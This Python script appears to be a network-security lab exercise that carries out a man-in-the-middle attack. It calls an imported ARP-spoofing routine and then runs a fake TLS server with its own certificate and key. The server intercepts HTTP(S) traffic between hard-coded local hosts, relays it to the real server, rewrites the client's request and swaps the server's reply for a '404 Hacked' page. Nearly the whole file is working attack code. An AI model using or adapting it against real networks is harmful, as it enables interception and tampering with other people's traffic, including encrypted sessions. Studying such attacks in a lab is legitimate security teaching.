import functools
import tornado.httpserver
import tornado.ioloop
import tornado.web
from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from lab2 import get_mac, attack
import ssl


class SSLSocketServer(object):
    def __init__(self, io_loop, certfile, keyfile, attacker_ip, port, server_ip):
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.setblocking(0)
        server_sock.bind((attacker_ip, port))
        server_sock.listen(128)
        callback = functools.partial(self.connection_ready, server_sock)
        io_loop.add_handler(server_sock.fileno(), callback, io_loop.READ)
        self.port = port
        self.server_ip = server_ip
        self.certfile = certfile
        self.keyfile = keyfile

    def connection_ready(self, sock, fd, events):
        node_sock, addr = sock.accept()
        print("Client {}:{} accepted".format(addr[0], addr[1]))

        if self.port == 443:
            node_sock = ssl.wrap_socket(
                node_sock,
                do_handshake_on_connect=False,
                server_side=True,
                keyfile=self.keyfile,
                certfile=self.certfile,
                ssl_version=ssl.PROTOCOL_TLS
            )
        print("Client {}:{} connected. Reading data...".format(addr[0], addr[1]))

        client_data = node_sock.recv(1024)
        while not client_data.decode("utf-8").endswith("\r\n\r\n"):
            print(client_data.decode("utf-8"))
            d = node_sock.recv(1024)
            if d:
                client_data += d
            else:
                break
        print("Client {}:{} sent data. Connecting to server...".format(addr[0], addr[1]))

        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.settimeout(10)
        if self.port == 443:
            server_sock = ssl.wrap_socket(server_sock, ssl_version=ssl.PROTOCOL_TLS)
        server_sock.connect((self.server_ip, self.port))
        print("Server {}:{} connected. Sending data...".format(self.server_ip, self.port))
        server_sock.send(work_with_data(client_data, True))
        print("Server {}:{} got data. Reading responce...".format(self.server_ip, self.port))
        with server_sock:
            server_data = server_sock.recv(4096)
            # while True:
            #    d = server_sock.recv(1024)
            #    if d:
            #        server_data += d
            #    else:
            #        break
        print("Server {}:{} sent responce. Sending data to client {}:{}".format(self.server_ip, self.port, addr[0],
                                                                                addr[1]))
        node_sock.send(work_with_data(server_data, False))
        print("Done")
        node_sock.close()


def work_with_data(data, is_client):
    if is_client:
        print("Client sent data:")
    else:
        print("Server sent data:")
    # Transforming data
    # Try replace data in strings (not work with images etc)
    try:
        print(data)
        if is_client:
            data = bytes(data.decode("utf-8").replace("Mozilla", "Hacker"), encoding="utf-8")
        else:
            data = bytes(
                'HTTP/1.1 404 Not Found\r\nServer: nginx/1.14.0 (Ubuntu)\r\n\r\n<html><head><title>404 Not Found</title></head>\r\n<body bgcolor="white">\r\n<center><h1>404 Hacked</h1></center>\r\n<hr><center>hacker/1.14.0 (Ubuntu)</center>\r\n</body>\r\n</html>\r\n',
                encoding="utf-8")
    except Exception as e:
        print(e)
    finally:
        return data


def start_fake_webserver(certfile, keyfile, attacker_ip, port, server_ip):
    io_loop = tornado.ioloop.IOLoop.instance()
    worker = SSLSocketServer(io_loop, certfile, keyfile, attacker_ip, port, server_ip)
    io_loop.start()


def do_mitm(client_ip, server_ip, interface, attacker_ip, gateway_ip, port, certfile, keyfile):
    print("Starting ARP spoofing...")
    attack([server_ip], gateway_ip, interface, sleep=False)
    print("ARP Spoofer started")
    print("Starting WebServer...")
    start_fake_webserver(certfile, keyfile, attacker_ip, port, server_ip)


def main():
    interface = "ens33"
    client_ip = "192.168.0.163"
    server_ip = "192.168.0.228"
    attacker_ip = "192.168.0.250"
    gateway_ip = "192.168.0.107"
    certfile = "server.crt"
    keyfile = "server.key"
    port = 443
    do_mitm(client_ip, server_ip, interface, attacker_ip, gateway_ip, port, certfile, keyfile)


if __name__ == "__main__":
    main()